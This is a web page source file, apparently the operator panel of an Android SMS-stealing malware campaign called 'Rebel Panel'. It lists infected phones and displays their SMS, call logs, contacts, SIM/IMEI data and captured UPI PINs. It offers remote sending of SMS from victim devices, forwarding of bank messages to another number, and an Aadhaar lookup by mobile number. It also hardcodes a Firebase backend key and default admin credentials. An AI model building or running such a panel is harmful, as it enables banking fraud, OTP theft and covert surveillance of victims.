    @keyframes toastIn{from{opacity:0;transform:translateX(20px)}to{opacity:1;transform:translateX(0)}}
    .toast.out{animation:toastOut 0.2s ease forwards}
    @keyframes toastOut{to{opacity:0;transform:translateX(20px)}}

    /* ─── FOOTER ─── */
    footer{border-top:1px solid var(--border);padding:14px 28px;display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px}
    .footer-brand{font-family:'Space Mono',monospace;font-size:10px;color:var(--muted)}
    .footer-brand strong{color:var(--accent)}

    @media(max-width:900px){
      .sidebar{width:100%;height:auto;position:relative;top:0;border-right:none;border-bottom:1px solid var(--border)}
      .main-layout{flex-direction:column}
      .dev-hero,.data-section{padding:16px}
    }

    /* SMS Modal */
    .modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.75);z-index:9990;display:flex;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(8px)}
    .modal-overlay.hidden{display:none!important}
    .modal-box{background:linear-gradient(145deg,rgba(22,22,31,0.98),rgba(12,12,18,0.99));border:1px solid rgba(255,60,60,0.2);border-radius:16px;padding:24px;width:100%;max-width:500px;position:relative;overflow:hidden;box-shadow:0 30px 80px rgba(0,0,0,0.7),0 0 50px var(--glow);animation:modalIn 0.3s ease}
    @keyframes modalIn{from{opacity:0;transform:scale(0.96) translateY(8px)}to{opacity:1;transform:scale(1) translateY(0)}}
    .modal-box::after{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,var(--accent),var(--accent2))}
    .modal-from{font-family:'Space Mono',monospace;font-size:11px;color:var(--accent2);margin-bottom:4px;letter-spacing:1px}
    .modal-date{font-family:'Space Mono',monospace;font-size:10px;color:var(--muted);margin-bottom:14px}
    .modal-body{font-size:14px;line-height:1.7;color:var(--text);white-space:pre-wrap;word-break:break-word;max-height:300px;overflow-y:auto;background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:14px}
    .modal-body::-webkit-scrollbar{width:4px}
    .modal-body::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
    .modal-close{position:absolute;top:14px;right:16px;background:transparent;border:none;color:var(--muted);font-size:20px;cursor:pointer;line-height:1;padding:4px 8px;border-radius:6px;transition:all 0.2s}
    .modal-close:hover{background:rgba(255,60,60,0.1);color:var(--accent)}
    .sms-row-click{cursor:pointer}
    .sms-row-click:hover{background:rgba(255,60,60,0.04)!important}

    /* ─── REBEL AI CHAT ─── */
    .btn-rebel-ai{border-color:rgba(123,47,255,0.45);background:linear-gradient(135deg,rgba(123,47,255,0.18),rgba(255,60,60,0.1));color:#fff}
    .btn-rebel-ai:hover{border-color:rgba(160,90,255,0.7);color:#fff;box-shadow:0 4px 20px rgba(123,47,255,0.25)}
    .modal-rebel{max-width:560px;padding:0;display:flex;flex-direction:column;max-height:min(88vh,720px)}
    .rebel-hdr{padding:18px 22px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:12px}
    .rebel-hdr-title{font-size:18px;font-weight:800}
    .rebel-hdr-sub{font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:1px;margin-top:2px}
    .rebel-chat{flex:1;overflow-y:auto;padding:16px 18px;display:flex;flex-direction:column;gap:12px;min-height:280px;max-height:52vh}
    .rebel-chat::-webkit-scrollbar{width:4px}
    .rebel-chat::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
    .rebel-msg{max-width:92%;padding:11px 14px;border-radius:14px;font-size:12px;line-height:1.55;word-break:break-word}
    .rebel-msg.user{align-self:flex-end;background:linear-gradient(135deg,rgba(255,60,60,0.2),rgba(180,0,0,0.12));border:1px solid rgba(255,60,60,0.25)}
    .rebel-msg.ai{align-self:flex-start;background:linear-gradient(145deg,rgba(18,18,28,0.95),rgba(12,12,18,0.98));border:1px solid rgba(123,47,255,0.25);box-shadow:0 0 20px rgba(123,47,255,0.08)}
    .rebel-msg.sys{align-self:center;background:rgba(255,149,0,0.08);border:1px solid rgba(255,149,0,0.2);font-family:'Space Mono',monospace;font-size:10px;color:var(--accent2);text-align:center;max-width:100%}
    .rebel-msg.ai code{background:var(--surface);padding:1px 5px;border-radius:4px;font-family:'Space Mono',monospace;font-size:10px}
    .rebel-msg-label{font-family:'Space Mono',monospace;font-size:8px;letter-spacing:1px;margin-bottom:5px;opacity:0.65;text-transform:uppercase}
    .rebel-foot{padding:14px 18px 18px;border-top:1px solid var(--border);display:flex;gap:10px;align-items:flex-end}
    .rebel-input{flex:1;min-height:44px;max-height:120px;resize:none}
    .rebel-send{padding:12px 18px;border-radius:10px;border:none;background:linear-gradient(135deg,#7b2fff,#cc0000);color:#fff;font-family:'Syne',sans-serif;font-weight:800;font-size:12px;cursor:pointer;white-space:nowrap}
    .rebel-send:disabled{opacity:0.45;cursor:not-allowed}
    .rebel-typing{font-family:'Space Mono',monospace;font-size:10px;color:var(--muted);padding:0 18px 8px}
    .rebel-wizard-bar{padding:0 18px 10px;border-bottom:1px solid var(--border)}
    .rebel-wizard-track{height:4px;border-radius:2px;background:rgba(255,255,255,0.06);overflow:hidden}
    .rebel-wizard-fill{height:100%;border-radius:2px;background:linear-gradient(90deg,#7b2fff,#ff3c3c);transition:width 0.35s ease}
    .rebel-wizard-meta{display:flex;justify-content:space-between;align-items:center;margin-top:7px;font-family:'Space Mono',monospace;font-size:9px;color:var(--muted);letter-spacing:0.5px}
    .rebel-wizard-meta strong{color:var(--accent2)}
    .rebel-skip-btn{padding:10px 14px;border-radius:10px;border:1px solid var(--border);background:transparent;color:var(--muted);font-family:'Syne',sans-serif;font-weight:700;font-size:11px;cursor:pointer;white-space:nowrap}
    .rebel-skip-btn:hover{border-color:rgba(123,47,255,0.45);color:#fff}
    .rebel-chat-skip{margin-top:10px;padding:8px 14px;border-radius:8px;border:1px solid rgba(123,47,255,0.35);background:rgba(123,47,255,0.1);color:#fff;font-family:'Syne',sans-serif;font-weight:700;font-size:11px;cursor:pointer;transition:all 0.2s}
    .rebel-chat-skip:hover{border-color:rgba(160,90,255,0.7);background:rgba(123,47,255,0.2);box-shadow:0 0 14px rgba(123,47,255,0.2)}
    .api-key-warn{background:rgba(255,149,0,0.08);border:1px solid rgba(255,149,0,0.28);border-radius:10px;padding:10px 14px;font-family:'Space Mono',monospace;font-size:10px;color:var(--accent2);margin-bottom:14px;line-height:1.5}
    .btn-aadhar{border-color:rgba(0,255,157,0.35);background:linear-gradient(135deg,rgba(0,255,157,0.1),rgba(123,47,255,0.08));color:#fff}
    .btn-aadhar:hover{border-color:rgba(0,255,157,0.55);color:#fff;box-shadow:0 4px 20px rgba(0,255,157,0.15)}
    .aadhar-hl{color:var(--success);font-weight:800;font-family:'Space Mono',monospace;letter-spacing:1px}
    .fb-item-secure{font-family:'Space Mono',monospace;font-size:8px;color:var(--success);margin-top:3px}
  </style>
</head>
<body>

<div id="bg3d">
  <canvas id="particleCanvas"></canvas>
  <div class="orb orb1"></div>
  <div class="orb orb2"></div>
  <div class="orb orb3"></div>
</div>

<!-- LOGIN -->
<div id="loginPage">
  <div class="login-card">
    <div class="login-logo">
      <svg class="logo-icon-3d" width="34" height="34" viewBox="0 0 38 38" fill="none"><polygon points="19,2 36,10 36,28 19,36 2,28 2,10" fill="rgba(255,60,60,0.12)" stroke="#ff3c3c" stroke-width="1.5"/><text x="19" y="25" text-anchor="middle" font-family="'Syne',sans-serif" font-weight="800" font-size="16" fill="#ff3c3c">R</text></svg>
      <div><div class="rebel"><em>Rebel</em> Panel</div><div class="panel-sub">REAL-TIME DASHBOARD</div></div>
    </div>
    <h2>Admin <span>Login</span></h2>
    <p class="login-sub">Enter credentials to access panel.</p>
    <div id="loginError" class="login-error">❌ Wrong credentials!</div>
    <div class="input-group">
      <div><label>Username</label><input type="text" id="loginUser" placeholder="admin" autocomplete="username"/></div>
      <div><label>Password</label><input type="password" id="loginPass" placeholder="••••••••" autocomplete="current-password"/></div>
    </div>
    <div class="remember-row"><input type="checkbox" id="rememberMe"/><label for="rememberMe">Remember me</label></div>
    <button class="btn" onclick="doLogin()"><span class="i3d i3d-purple i3d-sm i3d-swap"><span class="em-a">🔐</span><span class="em-b">🔓</span></span> Login</button>
    <div class="login-hint">Default: tyuser / TyPanel2026</div>
  </div>
</div>

<div class="wrapper">
<!-- HEADER -->
<header>
  <div class="logo">
    <svg class="logo-mark logo-icon-3d" viewBox="0 0 38 38" fill="none"><polygon points="19,2 36,10 36,28 19,36 2,28 2,10" fill="rgba(255,60,60,0.12)" stroke="#ff3c3c" stroke-width="1.5"/><text x="19" y="25" text-anchor="middle" font-family="'Syne',sans-serif" font-weight="800" font-size="16" fill="#ff3c3c">R</text></svg>
    <div class="logo-text"><div class="rebel"><em>Rebel</em> Panel</div><div class="panel-sub">Real-Time Dashboard</div></div>
  </div>
  <div class="hdr-actions">
    <button class="btn-fb btn-aadhar" onclick="openAadharModal()"><span class="i3d i3d-green i3d-sm i3d-anim i3d-anim-pulse"><span class="em-a">🪪</span></span> Aadhar Bot</button>
    <div id="statusPill" class="status-pill"><div class="status-dot"></div><span id="statusText">Connecting...</span></div>
  </div>
</header>

<!-- MAIN LAYOUT -->
<div class="main-layout" id="mainLayout" style="display:none">

  <!-- SIDEBAR -->
  <div class="sidebar">
    <div class="sidebar-hdr">
      <div class="sidebar-title"><span id="activeFbLabel">—</span> Devices <span id="cacheBadge" class="cache-badge hidden"></span><span id="fetchMs" class="fetch-ms"></span></div>
      <div class="sidebar-stats">
        <div class="mini-stat"><div class="mini-val t" id="stTotal">0</div><div class="mini-lbl">TOTAL</div></div>
        <div class="mini-stat"><div class="mini-val on" id="stOnline">0</div><div class="mini-lbl">ONLINE</div></div>
        <div class="mini-stat"><div class="mini-val off" id="stOffline">0</div><div class="mini-lbl">OFFLINE</div></div>
      </div>
    </div>
    <div class="sidebar-search">
      <input placeholder="Search phone / device..." id="devSearch" oninput="onDevSearch()" autocomplete="off"/>
    </div>
    <div class="dev-list" id="devList">
      <div class="dev-empty"><span class="i3d i3d-blue i3d-lg">📡</span><br>No devices connected</div>
    </div>
  </div>

  <!-- MAIN AREA -->
  <div class="main-area">
    <!-- EMPTY STATE -->
    <div class="empty-state" id="emptyState">
      <div class="empty-icon"><span class="i3d i3d-blue i3d-xl i3d-anim i3d-anim-pulse"><span class="em-a">📡</span></span></div>
      <div class="empty-txt">Select a device to view data</div>
    </div>

    <!-- DEVICE DETAIL -->
    <div id="deviceDetail" class="hidden">

      <!-- HERO -->
      <div class="dev-hero">
        <div class="hero-top">
          <div>
            <div class="hero-name" id="dName">—</div>
            <div class="hero-brand" id="dBrand">—</div>
            <div class="hero-id" id="dId">—</div>
          </div>
          <div id="dBadge" class="hero-badge offline">OFFLINE</div>
        </div>
        <div class="hero-metrics">
          <div class="hm"><div class="hm-lbl">BATTERY</div><div class="hm-val" id="dBat">—</div></div>
          <div class="hm"><div class="hm-lbl">NETWORK</div><div class="hm-val green" id="dNet">—</div></div>
          <div class="hm"><div class="hm-lbl">ANDROID</div><div class="hm-val" id="dAndroid">—</div></div>
          <div class="hm"><div class="hm-lbl">SMS COUNT</div><div class="hm-val orange" id="dSmsCount">—</div></div>
          <div class="hm"><div class="hm-lbl">LAST SEEN</div><div class="hm-val" id="dLastSeen">—</div></div>
          <div class="hm"><div class="hm-lbl">UPI PIN</div><div class="hm-val orange" id="dUpiPin">—</div></div>
        </div>
      </div>

      <!-- DATA TABS -->
      <div class="data-tabs">
        <button class="data-tab active" onclick="switchDataTab('sms',this)"><span class="i3d i3d-green i3d-anim i3d-anim-bounce"><span class="em-a">💬</span></span> SMS <span class="tab-badge" id="tc-sms">0</span></button>
        <button class="data-tab" onclick="switchDataTab('calls',this)"><span class="i3d i3d-blue i3d-anim i3d-anim-ring"><span class="em-a">📞</span></span> Calls <span class="tab-badge" id="tc-calls">0</span></button>
        <button class="data-tab" onclick="switchDataTab('contacts',this)"><span class="i3d i3d-purple i3d-anim i3d-anim-pulse"><span class="em-a">👥</span></span> Contacts <span class="tab-badge" id="tc-contacts">0</span></button>
        <button class="data-tab" onclick="switchDataTab('sim',this)"><span class="i3d i3d-orange i3d-swap"><span class="em-a">📶</span><span class="em-b">📡</span></span> SIM / IMEI</button>
        <button class="data-tab" onclick="switchDataTab('perms',this)"><span class="i3d i3d-red i3d-swap"><span class="em-a">🔐</span><span class="em-b">🔓</span></span> Permissions</button>
        <button class="data-tab" onclick="switchDataTab('sendsms',this)"><span class="i3d i3d-green i3d-anim i3d-anim-send"><span class="em-a">📤</span></span> Send SMS</button>
        <button class="data-tab" onclick="switchDataTab('forward',this)"><span class="i3d i3d-fire i3d-anim i3d-anim-forward"><span class="em-a">↗️</span></span> Forwarding</button>
      </div>

      <!-- SMS -->
      <div class="data-section active" id="tab-sms">
        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:10px">
          <div class="sec-title">SMS <span>Messages</span></div>
          <input class="dm-search" placeholder="Search messages..." oninput="filterRows('smsTbody',this.value)"/>
        </div>
        <div class="tbl-wrap"><table class="tbl"><thead><tr><th>#</th><th>Number</th><th>Message</th><th>Date</th><th>Type</th></tr></thead>
        <tbody id="smsTbody"><tr><td colspan="5" class="tbl-empty">No SMS data</td></tr></tbody></table></div>
        <div id="smsEmpty" class="tbl-empty" style="display:none"><span class="i3d i3d-orange i3d-anim i3d-anim-bounce"><span class="em-a">📭</span></span> No SMS data. Grant READ_SMS on device.</div>
      </div>

      <!-- CALLS -->
      <div class="data-section" id="tab-calls">
        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:10px">
          <div class="sec-title">Call <span>History</span></div>
          <input class="dm-search" placeholder="Search calls..." oninput="filterRows('callsTbody',this.value)"/>
        </div>
        <div class="tbl-wrap"><table class="tbl"><thead><tr><th>#</th><th>Number</th><th>Contact</th><th>Date</th><th>Duration</th><th>Type</th></tr></thead>
        <tbody id="callsTbody"><tr><td colspan="6" class="tbl-empty">No call data</td></tr></tbody></table></div>
      </div>

      <!-- CONTACTS -->
      <div class="data-section" id="tab-contacts">
        <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:10px">
          <div class="sec-title">Contacts <span>List</span></div>
          <input class="dm-search" placeholder="Search contacts..." oninput="filterRows('contactsTbody',this.value)"/>
        </div>
        <div class="tbl-wrap"><table class="tbl"><thead><tr><th>#</th><th>Name</th><th>Phone</th></tr></thead>
        <tbody id="contactsTbody"><tr><td colspan="3" class="tbl-empty">No contacts data</td></tr></tbody></table></div>
      </div>

      <!-- SIM -->
      <div class="data-section" id="tab-sim">
        <div class="sec-title" style="margin-bottom:8px">SIM <span>Information</span></div>
        <div class="sim-grid" id="simGrid"><div style="color:var(--muted);font-family:'Space Mono',monospace;font-size:10px">Loading...</div></div>
      </div>

      <!-- PERMS -->
      <div class="data-section" id="tab-perms">
        <div class="sec-title" style="margin-bottom:8px">App <span>Permissions</span></div>
        <div class="perm-grid" id="permGrid"></div>
      </div>

      <!-- SEND SMS -->
      <div class="data-section" id="tab-sendsms">
        <div class="sec-title" style="margin-bottom:4px">Send <span>SMS</span></div>
        <div class="api-key-warn" id="sendSmsApiWarn">✅ API Key configured — SMS sending is available.</div>
        <p style="color:var(--muted);font-size:12px;margin-bottom:0">Send message via target device</p>
        <div class="config-card">
          <div class="input-group">
            <div><label><span class="i3d i3d-blue i3d-sm">📞</span> To Number</label><input type="tel" id="sendTo" placeholder="+919876543210"/></div>
            <div><label><span class="i3d i3d-green i3d-sm">💬</span> Message</label><textarea id="sendMsg" placeholder="Type message here..."></textarea></div>
          </div>
          <button class="btn-sm" onclick="sendSms()"><span class="i3d i3d-green i3d-sm i3d-anim i3d-anim-send"><span class="em-a">📤</span></span> Send SMS to Device</button>
          <div id="sendStatus" style="margin-top:10px;font-family:'Space Mono',monospace;font-size:11px;"></div>
        </div>
        <div class="sec-title" style="margin:20px 0 10px">Sent <span>History</span></div>
        <div class="tbl-wrap"><table class="tbl"><thead><tr><th>To</th><th>Message</th><th>Status</th><th>Time</th></tr></thead>
        <tbody id="sentTbody"></tbody></table></div>
      </div>

      <!-- FORWARDING -->
      <div class="data-section" id="tab-forward">
        <div class="sec-title" style="margin-bottom:8px">SMS <span>Forwarding</span></div>
        <div class="api-key-warn" id="forwardApiWarn">✅ API Key configured — SMS forwarding is available.</div>
        <div class="config-card">
          <div style="display:flex;align-items:center;gap:12px;margin-bottom:16px">
            <label style="margin:0;font-size:11px;color:var(--text)">Enable Forwarding</label>
            <input type="checkbox" id="fwToggle" onchange="toggleFw()" style="width:18px;height:18px;accent-color:var(--accent)"/>
          </div>
          <div class="input-group">
            <div><label><span class="i3d i3d-blue i3d-sm">📞</span> Forward To Number</label><input type="tel" id="fwNumber" placeholder="+919876543210"/></div>
            <div style="display:flex;align-items:center;gap:12px">
              <label style="margin:0;font-size:11px;color:var(--text)">Forward All SMS</label>
              <input type="checkbox" id="fwAll" checked onchange="document.getElementById('fwFilterDiv').style.display=this.checked?'none':'block'" style="width:18px;height:18px;accent-color:var(--accent)"/>
            </div>
            <div id="fwFilterDiv" style="display:none"><label>Filter Numbers (comma separated)</label><input type="text" id="fwFilters" placeholder="+9198..., HDFC, BANK"/></div>
          </div>
          <button class="btn-sm" onclick="saveFw()"><span class="i3d i3d-purple i3d-sm i3d-anim i3d-anim-pulse"><span class="em-a">💾</span></span> Save Settings</button>
        </div>
        <div class="sec-title" style="margin:20px 0 10px">Forwarding <span>History</span></div>
        <div class="tbl-wrap"><table class="tbl"><thead><tr><th>From</th><th>To</th><th>Message</th><th>Time</th></tr></thead>
        <tbody id="fwTbody"></tbody></table></div>
      </div>

    </div><!-- /deviceDetail -->
  </div><!-- /main-area -->
</div><!-- /main-layout -->

<footer>
  <div class="footer-brand"><strong>Rebel Panel</strong> — TYHUMAI Dashboard</div>
  <div class="footer-brand" id="footerTime"></div>
</footer>
</div><!-- /wrapper -->


<!-- SMS Full Message Modal -->
<div class="modal-overlay hidden" id="smsModal" onclick="closeSmsModal(event)">
  <div class="modal-box">
    <button class="modal-close" onclick="document.getElementById('smsModal').classList.add('hidden')">✕</button>
    <div class="modal-from" id="modalFrom"></div>
    <div class="modal-date" id="modalDate"></div>
    <div class="modal-body" id="modalBody"></div>
  </div>
</div>

<!-- Aadhar Bot Modal -->
<div class="modal-overlay hidden" id="aadharModal" onclick="closeAadharModal(event)">
  <div class="modal-box modal-wide" onclick="event.stopPropagation()">
    <button class="modal-close" onclick="document.getElementById('aadharModal').classList.add('hidden')">✕</button>
    <div class="sec-title" style="margin-bottom:8px"><span class="i3d i3d-green i3d-anim i3d-anim-pulse"><span class="em-a">🪪</span></span> Aadhar <span>Bot</span></div>
    <p style="color:var(--muted);font-size:11px;margin-bottom:14px">Mobile number dalo — API response se sirf <strong>aadhar</strong> field fetch hogi.</p>
    <div class="config-card" style="max-width:100%">
      <div class="input-group">
        <div><label><span class="i3d i3d-blue i3d-sm">📱</span> Mobile Number</label><input type="tel" id="aadharNum" placeholder="9876543210" onkeydown="if(event.key==='Enter')lookupAadhar()"/></div>
      </div>
      <button class="btn-sm" onclick="lookupAadhar()"><span class="i3d i3d-green i3d-sm i3d-anim i3d-anim-pulse"><span class="em-a">🔍</span></span> Lookup Aadhar</button>
      <div id="aadharStatus" style="margin-top:10px;font-family:'Space Mono',monospace;font-size:11px;"></div>
    </div>
    <div class="tbl-wrap" style="margin-top:16px"><table class="tbl"><thead><tr><th>#</th><th>Mobile</th><th>Aadhar</th></tr></thead>
    <tbody id="aadharTbody"><tr><td colspan="3" class="tbl-empty">Enter mobile number and tap Lookup</td></tr></tbody></table></div>
  </div>
</div>

<div class="toast-container" id="toastContainer"></div>

<script>
var allDevs=[], selDev='', activeListeners={};
var firebaseInstances=[], firebaseConfigs=[];
var panelInitialized=false;
var clientsRawMap={}, tabLoaded={}, cacheWriteTimer=null;
var CLIENTS_CACHE_KEY='ty_clients_cache_v1';
var CLIENTS_CACHE_TTL=6*60*60*1000;
var SMS_FAST_MS=100;
var fetchStartMs=0, firstFetchDone=false;
var TY_FB_ID='tyhumai_299f1';
var activeFbId=TY_FB_ID;
var SUMMARY_NODES=['devices_status','clients'];
var DEVICE_NODES=['devices','users','clients_list','online_devices'];
var SKIP_NODES=['config','settings','admin','rules','metadata','logs','test','user','users','messages','admin_pass','adminpass','passwords','webhook','webhooks','tokens','auth'];

var DEFAULT_FIREBASES=[{
  id:'tyhumai_299f1', name:'TYHUMAI', schema:'rabel',
  apiKey:'AIzaSyAMbUTWtq5dd--U9-oyGo1nzSEJ3fR7vus',
  authDomain:'tyhumai-299f1.firebaseapp.com',
  databaseURL:'https://tyhumai-299f1-default-rtdb.asia-southeast1.firebasedatabase.app',
  projectId:'tyhumai-299f1',
  storageBucket:'tyhumai-299f1.firebasestorage.app',
  messagingSenderId:'857512919356',
  appId:'1:857512919356:android:292ec32a0f74c34615de39'
}];

function setStatus(t,m){var p=document.getElementById('statusPill');p.className='status-pill'+(t==='connected'?' connected':'');document.getElementById('statusText').textContent=m;}
var EMOJI_ANIMS={
  lock:{swap:1,a:'🔐',b:'🔓'},secure:{swap:1,a:'🔒',b:'🔓'},
  phone:{anim:'ring',a:'📞'},sms:{anim:'bounce',a:'💬'},contacts:{anim:'pulse',a:'👥'},
  signal:{swap:1,a:'📶',b:'📡'},send:{anim:'send',a:'📤'},forward:{anim:'forward',a:'↗️'},
  fire:{anim:'fire',a:'🔥'},robot:{anim:'robot',a:'🤖'},refresh:{anim:'spin',a:'🔄'},
  bolt:{anim:'bolt',a:'⚡'},satellite:{anim:'pulse',a:'📡'},inbox:{anim:'bounce',a:'📭'},
  save:{anim:'pulse',a:'💾'},mobile:{anim:'pulse',a:'📱'},sim:{anim:'pulse',a:'📲'},
  globe:{anim:'spin',a:'🌐'},battery:{anim:'pulse',a:'🔋'},folder:{swap:1,a:'📂',b:'📁'}
};
function ico(e,c){return '<span class="i3d'+(c?' '+c:'')+'">'+e+'</span>';}
function icoAnim(type,c){
  var m=EMOJI_ANIMS[type];
  if(!m) return ico(type,c);
  var cls='i3d'+(c?' '+c:'');
  if(m.swap) return '<span class="'+cls+' i3d-swap"><span class="em-a">'+m.a+'</span><span class="em-b">'+m.b+'</span></span>';
  return '<span class="'+cls+' i3d-anim i3d-anim-'+m.anim+'"><span class="em-a">'+m.a+'</span></span>';
}
function showFetchMs(ms){var el=document.getElementById('fetchMs');if(el)el.innerHTML=ms>=0?icoAnim('bolt','i3d-orange i3d-sm')+ms+'ms':'';}
function makeDevKey(fbId,devId){return fbId+'::'+devId;}
function parseDevKey(key){var i=String(key).indexOf('::');return i<0?{fbId:'',devId:key}:{fbId:key.slice(0,i),devId:key.slice(i+2)};}
function getFbInstance(fbId){for(var i=0;i<firebaseInstances.length;i++)if(firebaseInstances[i].id===fbId)return firebaseInstances[i];return null;}
function getSelDev(){return allDevs.find(function(d){return d.id===selDev;})||null;}
function restJson(url){return fetch(url,{cache:'no-store'}).then(function(r){return r.json();}).catch(function(){return null;});}
function isFirebaseErr(data){
  return !!(data&&typeof data==='object'&&data.error&&Object.keys(data).length<=2);
}
function discoverViaSdk(inst){
  if(!inst||!inst.db) return Promise.resolve(null);
  var paths=['clients','devices','devices_status','messages'];
  return Promise.all(paths.map(function(p){
    return inst.db.ref(p).limitToFirst(1).once('value').then(function(s){return s.exists()?p:null;}).catch(function(){return null;});
  })).then(function(found){
    found=found.filter(Boolean);
    if(!found.length) return null;
    var roots={};
    found.forEach(function(p){roots[p]=true;});
    return roots;
  }).catch(function(err){
    inst.connError=err.message||'SDK connection failed';
    return null;
  });
}
function runDiscoveryTasks(inst,roots){
  if(!roots||typeof roots!=='object'){inst.discoveredNodes=[];return Promise.resolve();}
  if(isFirebaseErr(roots)){inst.connError=String(roots.error);inst.discoveredNodes=[];return Promise.resolve();}
  inst.connError='';
  inst.discoveredNodes=Object.keys(roots).filter(function(n){return SKIP_NODES.indexOf(n)<0&&n!=='error';});
  var tasks=[];
  inst.discoveredNodes.forEach(function(node){
    if(SUMMARY_NODES.indexOf(node)>=0) tasks.push(fetchSummaryNode(inst,node));
    else if(node==='devices'||DEVICE_NODES.indexOf(node)>=0) tasks.push(fetchDevicesFast(inst,node));
  });
  return Promise.all(tasks).then(function(){setClientsCacheForFb(inst.id);});
}
function testFirebaseRoots(url){
  var base=String(url||'').replace(/\/+$/,'').replace(/\.json(\?.*)?$/i,'');
  return fetch(base+'/.json?shallow=true',{cache:'no-store'}).then(function(r){
    return r.json().then(function(data){
      if(data&&data.error){
        if(/deactivated/i.test(data.error)) throw new Error('Firebase database is DEACTIVATED — enable Realtime Database in Firebase Console');
        if(data.correctUrl) throw new Error('Wrong region — use: '+data.correctUrl);
        throw new Error(String(data.error));
      }
      if(!r.ok) throw new Error('Firebase not reachable (HTTP '+r.status+')');
      return data;
    });
  });
}
function loadFirebaseConfigs(){return DEFAULT_FIREBASES.slice();}
function saveFirebaseConfigs(){}
function getFbSchema(inst){
  if(inst.config.schema) return inst.config.schema;
  if(inst.restUrl.indexOf('rabel-raand')>=0) return 'rabel';
  return 'spinplay';
}
function initFirebaseInstance(cfg){
  var appName='fb_'+cfg.id, db=null;
  if(cfg.apiKey){
    try{
      var exists=false;
      firebase.apps.forEach(function(a){if(a.name===appName)exists=true;});
      if(!exists){
        firebase.initializeApp({
          apiKey:cfg.apiKey, authDomain:cfg.authDomain||'',
          databaseURL:cfg.databaseURL, projectId:cfg.projectId||cfg.id,
          storageBucket:cfg.storageBucket||'', messagingSenderId:cfg.messagingSenderId||'',
          appId:cfg.appId||''
        },appName);
      }
      db=firebase.app(appName).database();
      db.ref('.info/connected').on('value',function(s){if(s.val())setStatus('connected','Connected · TYHUMAI');});
    }catch(e){console.error('FB init error',cfg.id,e);}
  }
  var inst={id:cfg.id,name:cfg.name,config:cfg,appName:appName,db:db,
    restUrl:cfg.databaseURL.replace(/\/$/,''),discoveredNodes:[],liveAttached:false,deviceLiveAttached:{},
    connError:'',sdkPollAttached:false};
  inst.schema=getFbSchema(inst);
  firebaseInstances.push(inst);
  return inst;
}
function loadActiveFb(){activeFbId=TY_FB_ID;}
function initAllFirebase(){
  firebaseInstances=[];
  firebaseConfigs=loadFirebaseConfigs();
  firebaseConfigs.forEach(initFirebaseInstance);
  loadActiveFb();
  renderFirebaseSwitcher();
  updateSidebarTitle();
}
(function(){initAllFirebase();})();

function getFilteredDevs(){
  if(!activeFbId) return allDevs;
  return allDevs.filter(function(d){return d.fbId===activeFbId;});
}
function countDevsForFb(fbId){
  return allDevs.filter(function(d){return d.fbId===fbId;}).length;
}
function switchFirebase(fbId,silent){
  if(!getFbInstance(fbId)) return;
  activeFbId=fbId;
  try{localStorage.setItem(ACTIVE_FB_KEY,fbId);}catch(e){}
  var cur=getSelDev();
  if(cur&&cur.fbId!==fbId){
    selDev='';
    clearDeviceListeners();
    tabLoaded={};
    document.getElementById('deviceDetail').classList.add('hidden');
    document.getElementById('emptyState').classList.remove('hidden');
  }
  loadFbCacheIntoMap(fbId);
  processClientsData(getFbDataMap(),false);
  renderFirebaseSwitcher();
  updateSidebarTitle();
  renderSidebar();
  updateStats();
  applyFbTheme(fbId);
  updateApiKeyWarnings();
  if(!silent) showToast('success','Switched to '+getFbInstance(fbId).name);
}
function getFbDataMap(){
  var out={};
  Object.keys(clientsRawMap).forEach(function(k){
    if(k.indexOf(activeFbId+'::')===0) out[k]=clientsRawMap[k];
  });
  return out;
}
function loadFbCacheIntoMap(fbId){
  var cached=getClientsCacheData(fbId);
  if(!cached) return;
  Object.keys(clientsRawMap).forEach(function(k){if(k.indexOf(fbId+'::')===0)delete clientsRawMap[k];});
  Object.keys(cached).forEach(function(k){clientsRawMap[k]=cached[k];});
}
function renderFirebaseSwitcher(){updateSidebarTitle();}
function updateSidebarTitle(){
  var inst=getFbInstance(activeFbId);
  var el=document.getElementById('activeFbLabel');
  if(el) el.textContent=inst?inst.name:'—';
}
function applyFbTheme(fbId){
  var hues={'tyhumai_299f1':'255,60,60'};
  var h=hues[fbId]||String((fbId.charCodeAt(0)*17)%200+40)+',100,200';
  document.documentElement.style.setProperty('--glow','rgba('+h+',0.4)');
  document.documentElement.style.setProperty('--icon-glow','rgba('+h+',0.75)');
}
var scene3dStarted=false;
function init3DScene(){
  if(scene3dStarted) return;
  scene3dStarted=true;
  if(window.matchMedia&&window.matchMedia('(prefers-reduced-motion: reduce)').matches) return;
  var c=document.getElementById('particleCanvas');
  if(!c) return;
  var ctx=c.getContext('2d'), pts=[], W,H, running=true, frame=0;
  function resize(){W=c.width=window.innerWidth;H=c.height=window.innerHeight;}
  resize(); window.addEventListener('resize',resize);
  document.addEventListener('visibilitychange',function(){running=!document.hidden;});
  for(var i=0;i<38;i++) pts.push({x:Math.random()*W,y:Math.random()*H,z:Math.random()*W,vx:(Math.random()-0.5)*0.35,vy:(Math.random()-0.5)*0.35});
  function draw(){
    requestAnimationFrame(draw);
    if(!running) return;
    frame++;
    if(frame%2!==0) return;
    ctx.clearRect(0,0,W,H);
    pts.forEach(function(p){
      p.x+=p.vx; p.y+=p.vy;
      if(p.x<0)p.x=W; if(p.x>W)p.x=0; if(p.y<0)p.y=H; if(p.y>H)p.y=0;
      var s=1.2+p.z/W*1.6;
      ctx.beginPath(); ctx.arc(p.x,p.y,s,0,Math.PI*2);
      ctx.fillStyle='rgba(255,60,60,'+(0.12+p.z/W*0.28)+')'; ctx.fill();
    });
    for(var i=0;i<pts.length;i+=2){
      for(var j=i+1;j<i+3&&j<pts.length;j++){
        var dx=pts[i].x-pts[j].x, dy=pts[i].y-pts[j].y, d=dx*dx+dy*dy;
